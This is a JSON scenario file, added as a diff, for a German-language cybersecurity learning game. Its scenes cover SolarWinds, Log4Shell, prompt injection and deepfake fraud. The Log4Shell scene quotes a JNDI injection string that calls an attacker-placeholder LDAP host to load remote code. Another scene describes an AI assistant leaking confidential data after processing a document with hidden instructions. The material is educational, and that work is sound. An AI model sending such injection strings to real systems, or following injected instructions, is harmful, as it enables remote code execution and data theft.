@@ -1,0 +1,303 @@
+{
+  "id": "supply_chain",
+  "epoch_id": "supply_chain",
+  "title": "Supply Chain — Die unsichtbare Bedrohung",
+  "narrator_mode": true,
+  "dynamic_choices": true,
+  "freetext_enabled": true,
+  "narrator_style": "Techno-Thriller mit paranoider Grundstimmung. Jedes Update koennte eine Hintertuer sein. Jede Abhaengigkeit ein Angriffsvektor. Vertrauen ist ein Exploit.",
+  "scenes": [
+    {
+      "id": "s1_solarwinds",
+      "title": "SolarWinds — Der perfekte Trojaner",
+      "narrative": "Dezember 2020. FireEye — selbst eine fuehrende Security-Firma — muss eingestehen: Sie wurden gehackt. Die Spur fuehrt zu einem vergifteten Update der SolarWinds Orion-Plattform. Die SUNBURST-Backdoor wurde in den Build-Prozess eingeschleust und mit dem naechsten regulaeren Update an 18.000 Organisationen verteilt — darunter US-Ministerien, Fortune-500-Unternehmen und kritische Infrastruktur. APT29 (Cozy Bear), Russlands Auslandsgeheimdienst SVR, steht im Verdacht. Du entdeckst verdaechtige DNS-Beacons zu avsvmcloud.com.",
+      "choices": [
+        {
+          "id": "s1_c1",
+          "text": "Vergiftete DLL analysieren — den SUNBURST-Code im Orion-Update untersuchen",
+          "icon": "code",
+          "skill_check": {
+            "pool_filter": "epoch:supply_chain",
+            "question_count": 4,
+            "pass_threshold": 3
+          },
+          "success_scene": "s2_log4shell",
+          "partial_scene": "s2_log4shell",
+          "fail_scene": "s1_fail"
+        },
+        {
+          "id": "s1_c2",
+          "text": "Laterale Bewegung via Golden SAML nachverfolgen — wie tief sind die Angreifer eingedrungen?",
+          "icon": "key",
+          "skill_check": {
+            "pool_filter": "epoch:supply_chain",
+            "question_count": 3,
+            "pass_threshold": 2
+          },
+          "success_scene": "s2_log4shell",
+          "partial_scene": "s2_log4shell",
+          "fail_scene": "s1_fail"
+        },
+        {
+          "id": "s1_c3",
+          "text": "Mit CISA koordinieren — nationale Incident Response einleiten",
+          "icon": "shield",
+          "skill_check": {
+            "pool_filter": "epoch:supply_chain",
+            "question_count": 3,
+            "pass_threshold": 2
+          },
+          "success_scene": "s2_log4shell",
+          "partial_scene": "s2_log4shell",
+          "fail_scene": "s1_fail"
+        }
+      ]
+    },
+    {
+      "id": "s1_fail",
+      "title": "Kompromittierung uebersehen",
+      "narrative": "Die SUNBURST-Backdoor war zu gut getarnt — sie wartete 12 Tage nach Installation, bevor sie aktiv wurde, und kommunizierte ueber legitim aussehende DNS-Anfragen. Du hast die Anomalien zu spaet erkannt. Aber FireEyes oeffentlicher Bericht gibt dir jetzt die IOCs, um weiterzuarbeiten.",
+      "choices": [
+        {
+          "id": "s1f_c1",
+          "text": "IOCs anwenden und betroffene Systeme identifizieren",
+          "icon": "search",
+          "skill_check": {
+            "pool_filter": "epoch:supply_chain",
+            "question_count": 3,
+            "pass_threshold": 2
+          },
+          "success_scene": "s2_log4shell",
+          "partial_scene": "s2_log4shell",
+          "fail_scene": "epilog_fail"
+        }
+      ]
+    },
+    {
+      "id": "s2_log4shell",
+      "title": "Log4Shell — Die Bibliothek die alles brach",
+      "narrative": "9. Dezember 2021. Ein Tweet loest globale Panik aus: CVE-2021-44228 in Apache Log4j. Eine simple JNDI-Injection — ${jndi:ldap://attacker.com/exploit} — erlaubt Remote Code Execution auf Millionen von Java-Anwendungen. Minecraft-Server waren die ersten Opfer, aber Log4j steckt ueberall: in Cloud-Diensten, Unternehmensanwendungen, IoT-Geraeten. Du musst innerhalb von Stunden die Exposition deiner gesamten Software-Landschaft bewerten.",
+      "choices": [
+        {
+          "id": "s2_c1",
+          "text": "Alle Systeme auf verwundbare Log4j-Versionen scannen",
+          "icon": "search",
+          "skill_check": {
+            "pool_filter": "epoch:supply_chain",
+            "question_count": 4,
+            "pass_threshold": 3
+          },
+          "success_scene": "s3_prompt_injection",
+          "partial_scene": "s3_prompt_injection",
+          "fail_scene": "s3_prompt_injection"
+        },
+        {
+          "id": "s2_c2",
+          "text": "WAF-Regeln implementieren um JNDI-Strings zu blockieren",
+          "icon": "firewall",
+          "skill_check": {
+            "pool_filter": "epoch:supply_chain",
+            "question_count": 3,
+            "pass_threshold": 2
+          },
+          "success_scene": "s3_prompt_injection",
+          "partial_scene": "s3_prompt_injection",
+          "fail_scene": "s3_prompt_injection"
+        },
+        {
+          "id": "s2_c3",
+          "text": "Kritische Services patchen und redeployen — Hotfix-Marathon",
+          "icon": "wrench",
+          "skill_check": {
+            "pool_filter": "epoch:supply_chain",
+            "question_count": 3,
+            "pass_threshold": 2
+          },
+          "success_scene": "s3_prompt_injection",
+          "partial_scene": "s3_prompt_injection",
+          "fail_scene": "s3_prompt_injection"
+        }
+      ]
+    },
+    {
+      "id": "s3_prompt_injection",
+      "title": "Prompt Injection — Die KI als Angriffsvektor",
+      "narrative": "2024. Kuenstliche Intelligenz ist allgegenwaertig — und wird zum neuen Angriffsvektor. Ein Enterprise-KI-Assistent beginnt ploetzlich vertrauliche Daten preiszugeben, nachdem er ein scheinbar harmloses Dokument verarbeitet hat. Indirekte Prompt Injection: Unsichtbare Anweisungen im Kontext manipulieren das Verhalten des LLM. Die Lieferkette hat eine neue Dimension — nicht mehr nur Code, sondern auch Trainingsdaten und Kontext-Fenster koennen vergiftet werden.",
+      "choices": [
+        {
+          "id": "s3_c1",
+          "text": "Prompt-Injection-Payload analysieren — wie wurde die KI manipuliert?",
+          "icon": "brain",
+          "skill_check": {
+            "pool_filter": "epoch:supply_chain",
+            "question_count": 4,
+            "pass_threshold": 3
+          },
+          "success_scene": "s4_deepfakes",
+          "partial_scene": "s4_deepfakes",
+          "fail_scene": "s4_deepfakes"
+        },
+        {
+          "id": "s3_c2",
+          "text": "Input-Sanitisierung und Output-Filterung implementieren",
+          "icon": "filter",
+          "skill_check": {
+            "pool_filter": "epoch:supply_chain",
+            "question_count": 3,
+            "pass_threshold": 2
+          },
+          "success_scene": "s4_deepfakes",
+          "partial_scene": "s4_deepfakes",
+          "fail_scene": "s4_deepfakes"
+        },
+        {
+          "id": "s3_c3",
+          "text": "Adversarial-Testing-Framework entwerfen — systematisch Schwachstellen finden",
+          "icon": "target",
+          "skill_check": {
+            "pool_filter": "epoch:supply_chain",
+            "question_count": 3,
+            "pass_threshold": 2
+          },
+          "success_scene": "s4_deepfakes",
+          "partial_scene": "s4_deepfakes",
+          "fail_scene": "s4_deepfakes"
+        }
+      ]
+    },
+    {
+      "id": "s4_deepfakes",
+      "title": "Deepfakes — Wenn Sehen nicht mehr Glauben ist",
+      "narrative": "2025. Ein ueberzeugender Deepfake-Videoanruf autorisiert eine Ueberweisung von 25 Millionen Dollar. Der CFO sah und hoerte seinen CEO — oder glaubte es zumindest. KI-generierte Stimmen und Videos sind inzwischen so realistisch, dass traditionelle Authentifizierung versagt. Desinformation, CEO-Fraud, manipulierte Beweise — die Grenze zwischen Realitaet und Faelschung loest sich auf. Du musst neue Verteidigungsstrategien fuer eine Post-Truth-Aera entwickeln.",
+      "choices": [
+        {
+          "id": "s4_c1",
+          "text": "Deepfake-Erkennung deployen — Artefakt-Analyse und Medien-Forensik",
+          "icon": "eye",
+          "skill_check": {
+            "pool_filter": "epoch:supply_chain",
+            "question_count": 4,
+            "pass_threshold": 3
+          },
+          "success_scene": "epilog_success",
+          "partial_scene": "epilog_partial",
+          "fail_scene": "s4_fail"
+        },
+        {
+          "id": "s4_c2",
+          "text": "Multi-Faktor-Verifizierung fuer Hochwerttransaktionen implementieren",
+          "icon": "lock",
+          "skill_check": {
+            "pool_filter": "epoch:supply_chain",
+            "question_count": 3,
+            "pass_threshold": 2
+          },
+          "success_scene": "epilog_success",
+          "partial_scene": "epilog_partial",
+          "fail_scene": "s4_fail"
+        },
+        {
+          "id": "s4_c3",
+          "text": "Organisationsweites Awareness-Training aufbauen — Mitarbeiter sensibilisieren",
+          "icon": "users",
+          "skill_check": {
+            "pool_filter": "epoch:supply_chain",
+            "question_count": 3,
+            "pass_threshold": 2
+          },
+          "success_scene": "epilog_success",
+          "partial_scene": "epilog_partial",
+          "fail_scene": "epilog_fail"
+        }
+      ]
+    },
+    {
+      "id": "s4_fail",
+      "title": "Der Betrug gelingt",
+      "narrative": "Die Deepfake-Technologie war zu ueberzeugend — der Betrug wurde erst nach der Ueberweisung entdeckt. Doch dieser Vorfall hat die Organisation wachgeruettelt. Neue Prozesse fuer Out-of-Band-Verifizierung werden nun priorisiert.",
+      "choices": [
+        {
+          "id": "s4f_c1",
+          "text": "Incident-Report erstellen und Sicherheitsprozesse ueberarbeiten",
+          "icon": "clipboard",
+          "skill_check": {
+            "pool_filter": "epoch:supply_chain",
+            "question_count": 3,
+            "pass_threshold": 2
+          },
+          "success_scene": "epilog_partial",
+          "partial_scene": "epilog_fail",
+          "fail_scene": "epilog_fail"
+        }
+      ]
+    },
+    {
+      "id": "epilog_success",
+      "title": "Meister der modernen Bedrohungslandschaft",
+      "narrative": "Von Supply-Chain-Angriffen ueber Zero-Day-Bibliotheken bis zu KI-Manipulation und Deepfakes — du hast die komplexeste Bedrohungslandschaft der IT-Geschichte navigiert. Du verstehst, dass Vertrauen in Software, Daten und sogar menschliche Wahrnehmung nicht mehr selbstverstaendlich ist. SBOM, Zero Trust und KI-Sicherheit sind deine Werkzeuge fuer eine Welt, in der jede Abhaengigkeit ein Risiko birgt.",
+      "is_epilog": true,
+      "epilog_type": "success",
+      "choices": []
+    },
+    {
+      "id": "epilog_partial",
+      "title": "Auf dem richtigen Weg",
+      "narrative": "Die moderne Bedrohungslandschaft ist ueberwältigend — und du hast wichtige Grundlagen gelegt. Supply-Chain-Sicherheit, Patch-Management und KI-Risiken sind keine abstrakten Konzepte mehr fuer dich. Mit mehr Praxis wirst du die unsichtbaren Angriffsflaechen meistern.",
+      "is_epilog": true,
+      "epilog_type": "partial",
+      "choices": []
+    },
+    {
+      "id": "epilog_fail",
+      "title": "Die Komplexitaet gewinnt",
+      "narrative": "Die Verflechtung moderner Software-Lieferketten und KI-Systeme hat dich ueberfordert. Das ist kein Versagen — selbst erfahrene Security-Teams kaempfen taeglich mit diesen Herausforderungen. Geh die einzelnen Vorfaelle nochmal durch und baue Schritt fuer Schritt dein Verstaendnis auf.",
+      "is_epilog": true,
+      "epilog_type": "fail",
+      "choices": []
+    }
+  ],
+  "historical_facts": [
+    {
+      "id": "solarwinds_timeline",
+      "title": "SolarWinds SUNBURST-Angriff",
+      "year": 2020,
+      "description": "Im Maerz 2020 schleusten Angreifer die SUNBURST-Backdoor in den Build-Prozess von SolarWinds Orion ein. Die kompromittierten Updates wurden zwischen Maerz und Juni 2020 an ca. 18.000 Organisationen verteilt. FireEye entdeckte den Angriff erst im Dezember 2020.",
+      "significance": "Sophistiziertester Supply-Chain-Angriff der Geschichte — zeigte, dass der Build-Prozess selbst ein kritischer Angriffsvektor ist."
+    },
+    {
+      "id": "log4shell_cve",
+      "title": "Log4Shell (CVE-2021-44228)",
+      "year": 2021,
+      "description": "Am 9. Dezember 2021 wurde CVE-2021-44228 in Apache Log4j 2.x veroeffentlicht. Die JNDI-Injection erlaubte Remote Code Execution mit CVSS 10.0. Innerhalb von 72 Stunden wurden weltweit Millionen von Exploit-Versuchen registriert.",
+      "significance": "Zeigte die Fraglitaet des Open-Source-Oekosystems — eine einzelne Logging-Bibliothek, oft ohne Wissen der Nutzer eingebettet, gefaehrdete das halbe Internet."
+    },
+    {
+      "id": "ai_prompt_injection",
+      "title": "Prompt-Injection-Forschung",
+      "year": 2023,
+      "description": "Forscher wie Simon Willison und das OWASP-LLM-Top-10-Projekt dokumentierten systematisch Prompt-Injection-Angriffe auf Large Language Models. Indirekte Prompt Injection ueber vergiftete Dokumente wurde als besonders gefaehrlich identifiziert.",
+      "significance": "Definierte eine voellig neue Angriffskategorie fuer KI-Systeme — die OWASP LLM Top 10 wurden zum Industriestandard."
+    },
+    {
+      "id": "deepfake_fraud",
+      "title": "Deepfake-CEO-Betrug",
+      "year": 2024,
+      "description": "Im Februar 2024 wurde ein Finanzangestellter in Hongkong durch einen Deepfake-Videoanruf mit mehreren 'Kollegen' zu einer Ueberweisung von 25 Millionen USD verleitet. Alle Teilnehmer des Calls waren KI-generiert.",
+      "significance": "Bewies, dass Deepfakes reif fuer groessangelegten Finanzbetrug sind — traditionelle Verifikation per Video/Telefon ist nicht mehr ausreichend."
+    },
+    {
+      "id": "sbom_executive_order",
+      "title": "SBOM Executive Order",
+      "year": 2021,
+      "description": "US-Praesident Biden unterzeichnete im Mai 2021 Executive Order 14028, die Software Bill of Materials (SBOM) fuer alle Regierungslieferanten verpflichtend machte. NTIA definierte die Mindestanforderungen an SBOMs.",
+      "significance": "Erste gesetzliche Verpflichtung zu Software-Transparenz — machte Supply-Chain-Sicherheit von einer Best Practice zu einer regulatorischen Anforderung."
+    },
+    {
+      "id": "supply_chain_growth",
+      "title": "Anstieg von Supply-Chain-Angriffen",
+      "year": 2022,
+      "description": "Laut Sonatype stiegen Supply-Chain-Angriffe auf Open-Source-Software um 742% zwischen 2019 und 2022. Dependency Confusion, Typosquatting und kompromittierte Maintainer-Accounts wurden zu gaengigen Angriffsvektoren.",
+      "significance": "Supply-Chain-Angriffe wurden vom Einzelfall zum systematischen Bedrohungsmuster — die gesamte Software-Industrie musste ihre Abhaengigkeitsverwaaltung ueberdenken."
+    }
+  ]
+}
